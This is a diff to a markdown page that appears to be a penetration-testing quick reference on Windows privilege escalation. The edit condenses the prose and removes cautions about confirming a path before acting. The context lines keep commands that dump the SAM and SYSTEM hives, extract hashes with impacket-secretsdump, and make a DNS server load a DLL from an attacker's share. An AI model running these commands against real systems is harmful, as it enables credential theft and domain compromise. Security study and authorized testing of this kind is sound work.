@@ -2,7 +2,7 @@
 
 [← Windows quick reference](../04-windows-privesc.md)
 
-Read the current token, not just the account's group list. A named privilege may need to be enabled by the selected method before it can be used.
+Check current token; named rights may require enabling.
 
 ```powershell
 whoami /all
@@ -19,7 +19,7 @@ net localgroup
 | Server Operators | Check service configuration and restart rights. |
 | `SeDebugPrivilege` | Check whether the process can inspect LSASS or another privileged process. |
 
-For a confirmed local backup path:
+Local backup right:
 
 ```powershell
 reg save HKLM\SAM C:\Temp\sam.save
@@ -30,9 +30,9 @@ reg save HKLM\SYSTEM C:\Temp\system.save
 impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
-Save original service or file state before any change and restore it afterward.
+Save and restore original service/file state.
 
-For a confirmed DnsAdmins path, check whether you can set the DNS server plug-in DLL and restart the service. For Server Operators, check the exact service configuration and restart rights. These group names alone are not enough:
+DnsAdmins: plug-in DLL setting + DNS service restart. Server Operators: service config + restart rights.
 
 ```cmd
 dnscmd <dc> /config /serverlevelplugindll \\<kali-ip>\share\plugin.dll
